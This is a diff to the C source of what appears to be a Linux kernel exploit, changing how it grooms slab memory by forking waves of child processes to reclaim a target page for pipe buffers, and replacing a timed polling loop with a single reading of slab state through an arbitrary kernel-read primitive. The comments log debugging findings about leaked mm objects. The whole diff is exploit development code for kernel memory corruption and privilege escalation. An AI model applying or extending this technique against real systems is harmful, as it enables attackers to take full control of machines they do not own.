@@ -574,7 +574,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       target_owned = 1;
       break;
     }
-    size_t wave_n = (tsc == 0) ? objs_per_slab : wave_sz;
+    /* Exactly one slab's worth per wave (34), not 3*34+8=110.  Forensics
+     * (g14 killpoll): the 34 wave mms that land on the target page are
+     * PERMANENTLY leaked (inuse frozen 34 / freelist NULL for the whole
+     * 10s after a serial kill_child of 110) -- an mmgrab holder that
+     * never releases.  The divider between the never-leaking precedents
+     * (pre's clone_memfd: fork->kill within us, pre-sweep always reads
+     * inuse=0) and the always-leaking wave (~1s live time between the
+     * 110 forks and the kill) is how long the mm sits in pause() where
+     * a scanner can claim it.  Wave size objs_per_slab keeps a full
+     * slab turnover while cutting live time to ~55ms (34 forks ~25ms +
+     * serial kill ~30ms); the empty-slab burst for the min_partial
+     * flush now comes from 24 such small waves instead of 6 big ones. */
+    size_t wave_n = objs_per_slab;
     for (size_t i = 0; i < wave_n; i++) {
       wave_pids[w * wave_sz + i] = clone_child();
     }
@@ -636,21 +648,16 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
          * (groom) and its first tsc read -- this reproduces that gap at
          * the batch boundary.  Reads here are page-descriptor only
          * (proven safe); never derived pointers. */
-        /* inuse time-series after the serial kill: distinguishes a
-         * DELAYED free (scanner/mm_count holder releases within seconds
-         * -> inuse drops 34->0 at some tick => find the window) from a
-         * PERMANENT leak (inuse stuck 34 for the whole 10s => mm never
-         * freed).  Reads are page-descriptor only (proven safe). */
-        for (int r = 0; r < 11; r++) {
+        /* killpoll forensics retired (verdict closed: permanent leak --
+         * inuse frozen at 34 across a full 10s window at g14/77aa4ef7).
+         * One cheap read for the record, no polling stall. */
+        {
           uintptr_t hd = direct_to_head_page(conv_fd, base);
           uint64_t w28 = hd ? kernel_read64(conv_fd, hd + 0x28) : 1;
           uint64_t w20 = hd ? kernel_read64(conv_fd, hd + 0x20) : 0;
-          pr_info("pipe killpoll w=%d t=%dms inuse=%u +20=%016llx hd=%d\n",
-                  w, r * 1000, (unsigned)(w28 & 0xffffu),
-                  (unsigned long long)w20, hd ? 1 : 0);
-          if (!hd || (w28 & 0xffffu) == 0)
-            break;
-          usleep(1000000);
+          pr_info("pipe killpost w=%d inuse=%u +20=%016llx hd=%d\n", w,
+                  (unsigned)(w28 & 0xffffu), (unsigned long long)w20,
+                  hd ? 1 : 0);
         }
         {
           uint64_t t2 = read_target_slab_cache(conv_fd, base);
